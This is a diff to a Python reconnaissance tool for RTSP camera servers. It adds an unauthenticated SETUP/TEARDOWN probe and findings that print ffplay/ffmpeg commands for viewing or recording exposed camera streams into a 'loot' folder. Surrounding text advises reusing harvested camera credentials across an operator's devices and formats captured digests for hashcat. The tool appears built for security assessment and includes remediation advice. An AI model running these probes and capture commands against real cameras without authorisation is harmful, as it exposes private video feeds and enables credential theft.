@@ -361,16 +361,24 @@ def _http_tunnel_probe(ip: str, port: int, timeout: float) -> dict:
 
 
 def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
-          tls: bool = False, paths: tuple[tuple[str, str], ...] | None = None) -> dict:
+          tls: bool = False, paths: tuple[tuple[str, str], ...] | None = None,
+          do_setup_proof: bool = True) -> dict:
     """OPTIONS + DESCRIBE + optional path enum + digest capture. Returns:
       {reachable, tls, transport, server, public, allow, auth: {...},
        unauth_stream, sdp, paths: [{path, status, vendor}], liveness, cve_hits,
-       digest_capture, cert_cn}
+       digest_capture, cert_cn, sdp_base_uri, setup_probe}
+
+    When SDP carries a per-track control URI and `do_setup_proof` is set,
+    a single bounded SETUP is issued against the first non-aggregate control
+    URI (RTP/AVP/TCP interleaved — no external UDP flow), followed by an
+    immediate TEARDOWN. A 200 OK + Session header there is deterministic
+    T2 proof the server allocates a media session for anonymous clients.
     """
     out: dict = {"reachable": False, "tls": tls, "server": "", "public": [],
                  "allow": [], "auth": {}, "unauth_stream": False, "sdp": None,
                  "paths": [], "liveness": False, "cve_hits": [],
-                 "digest_capture": "", "cert_cn": ""}
+                 "digest_capture": "", "cert_cn": "", "sdp_base_uri": "",
+                 "setup_probe": {}}
     scheme = "rtsps" if tls else "rtsp"
 
     # OPTIONS.
@@ -452,8 +460,18 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
                 sdp_body = r[body_start + 4:]
                 if b"v=0" in sdp_body[:64]:
                     out["sdp"] = parse_sdp(sdp_body)
+                    out["sdp_base_uri"] = purl
 
     out["cve_hits"] = match_cves(out["server"])
+
+    # T2 SAFE proof: single-shot SETUP against a per-track control URI when
+    # SDP was disclosed anonymously. RTP/AVP/TCP interleaved keeps media on
+    # the same TCP socket (no separate UDP flow), and an immediate TEARDOWN
+    # releases the session. Never runs when auth was required.
+    if do_setup_proof and out.get("unauth_stream") and out.get("sdp"):
+        base = out.get("sdp_base_uri") or describe_url
+        out["setup_probe"] = unauth_setup_probe(
+            ip, port, timeout, tls, out["sdp"], base)
     return out
 
 
@@ -478,6 +496,7 @@ def _absorb_describe(out: dict, reply: bytes, uri: str) -> None:
             sdp = reply[body_start + 4:]
             if b"v=0" in sdp[:64]:
                 out["sdp"] = parse_sdp(sdp)
+                out["sdp_base_uri"] = uri
     elif st == 401:
         wa = _WWW_AUTH_RE.findall(reply)
         if wa:
@@ -492,6 +511,78 @@ def _absorb_describe(out: dict, reply: bytes, uri: str) -> None:
                     qop=out["auth"].get("qop", ""),
                     algorithm=out["auth"].get("algorithm", "MD5"),
                 )
+
+
+_TRANSPORT_RE = re.compile(rb"^Transport:\s*(.+)$", re.I | re.M)
+
+
+def _resolve_control_uri(control: str, base_uri: str) -> str:
+    """Resolve an SDP a=control value against the DESCRIBE base URL.
+
+    RFC 2326 §C.1.1: an absolute URI wins; a relative one is appended to
+    the base (Content-Base / DESCRIBE URL). Aggregate '*' is caller-filtered
+    upstream — it is never a SETUP target on its own.
+    """
+    if not control:
+        return base_uri
+    low = control.lower()
+    if low.startswith("rtsp://") or low.startswith("rtsps://"):
+        return control
+    return base_uri.rstrip("/") + "/" + control.lstrip("/")
+
+
+def unauth_setup_probe(ip: str, port: int, timeout: float, tls: bool,
+                       sdp: dict, base_uri: str) -> dict:
+    """T2 SAFE proof: single-shot SETUP against the first non-aggregate
+    control URI in `sdp`. Requests RTP/AVP/TCP interleaved transport (media
+    would ride the same TCP socket — no separate UDP flow allocated on the
+    network), reads the reply, and issues an immediate TEARDOWN with the
+    returned Session id. Bounded; no PLAY; no exfil.
+
+    Returns {ok, status, session, transport, control_uri, evidence}.
+    `ok` is True only when the server returned 200 with a Session header —
+    deterministic proof the server allocates a media session anonymously.
+    """
+    out: dict = {"ok": False, "status": 0, "session": "", "transport": "",
+                 "control_uri": "", "evidence": ""}
+    controls = [c for c in (sdp.get("controls") or []) if c and c.strip() != "*"]
+    if not controls:
+        return out
+    control_uri = _resolve_control_uri(controls[0].strip(), base_uri)
+    out["control_uri"] = control_uri
+    transport = "RTP/AVP/TCP;unicast;interleaved=0-1"
+    try:
+        with _open_socket(ip, port, timeout, tls=tls) as s:
+            reply = _send(s, _request(
+                "SETUP", control_uri, 20,
+                headers={"Transport": transport}), timeout)
+            if not reply or not reply.startswith(b"RTSP/"):
+                return out
+            st = _status(reply)
+            out["status"] = st
+            m = _SESSION_RE.search(reply)
+            if m:
+                out["session"] = m.group(1).decode("ascii", "replace").strip()
+            m = _TRANSPORT_RE.search(reply)
+            if m:
+                out["transport"] = m.group(1).decode("ascii", "replace").strip()
+            if st == 200 and out["session"]:
+                out["ok"] = True
+                header_end = reply.find(b"\r\n\r\n")
+                head = reply[:header_end] if header_end > 0 else reply[:512]
+                out["evidence"] = head.decode("ascii", "replace").strip()
+                # Polite TEARDOWN so the server doesn't hold the allocated
+                # session until its own timeout. Failure here is ignored —
+                # the server's session watchdog will collect it either way.
+                try:
+                    _send(s, _request(
+                        "TEARDOWN", control_uri, 21,
+                        headers={"Session": out["session"]}), timeout)
+                except OSError:
+                    pass
+    except OSError:
+        pass
+    return out
 
 
 def hashcat_line_sip(realm: str, method: str, uri: str, nonce: str,
@@ -661,6 +752,12 @@ _NARRATIVE = {
         "An rtsp://user:pass@host URL was observed in previously-collected text. "
         "Extract and stack the credential — the same pair very often re-uses on "
         "the same operator's other cameras and NVRs."),
+    "rtsp_setup_unauth": (
+        "SETUP against a per-track control URI returned 200 OK with a live "
+        "Session id and interleaved Transport — the server allocates a media "
+        "session for anonymous clients on this track. An unauthenticated PLAY "
+        "would immediately deliver RTP frames; recce stops at SETUP + TEARDOWN "
+        "so nothing is recorded from the sensor."),
 }
 
 
@@ -792,6 +889,37 @@ def findings(hosts: list[Host], probes: dict | None = None,
                         f"-c copy loot/rtsp_{h.ip}.mkv; "
                         f"ffmpeg -i loot/rtsp_{h.ip}.mkv -vframes 1 loot/rtsp_{h.ip}.jpg."),
                     depth_tier="t2"))
+
+                sp = pr.get("setup_probe") or {}
+                if sp.get("ok"):
+                    ctl = sp.get("control_uri") or ""
+                    sess = sp.get("session") or ""
+                    xport = sp.get("transport") or ""
+                    ev = sp.get("evidence") or ""
+                    out.append(_finding(
+                        "critical",
+                        "RTSP SETUP allocated media session anonymously",
+                        tgt,
+                        f"SETUP on control URI {ctl} returned 200 OK with "
+                        f"Session={sess} and Transport={xport}. The server "
+                        "accepted anonymous media-session allocation on this "
+                        "track — an unauthenticated PLAY would immediately "
+                        "deliver RTP frames. recce stopped at SETUP + TEARDOWN "
+                        "so nothing was recorded off the sensor.\n\n"
+                        f"Captured evidence (SETUP reply headers):\n{ev}",
+                        "ffplay / ffmpeg",
+                        f"ffplay -rtsp_transport tcp {ctl}   "
+                        f"# or: ffmpeg -rtsp_transport tcp -i {ctl} -t 5 "
+                        f"-c copy loot/rtsp_{h.ip}.mkv",
+                        "Require authentication on SETUP as well as DESCRIBE; "
+                        "return 401 to any SETUP without a valid Authorization "
+                        "header rather than allocating a media session.",
+                        ["CWE-306", "CWE-284"], kind="rtsp_setup_unauth",
+                        exploit_note=(
+                            f"ffplay -rtsp_transport tcp {ctl}; "
+                            f"ffmpeg -rtsp_transport tcp -i {ctl} -t 5 -c copy "
+                            f"loot/rtsp_{h.ip}.mkv"),
+                        depth_tier="t2"))
             elif pr.get("sdp"):
                 sdp = pr["sdp"]
                 out.append(_finding(
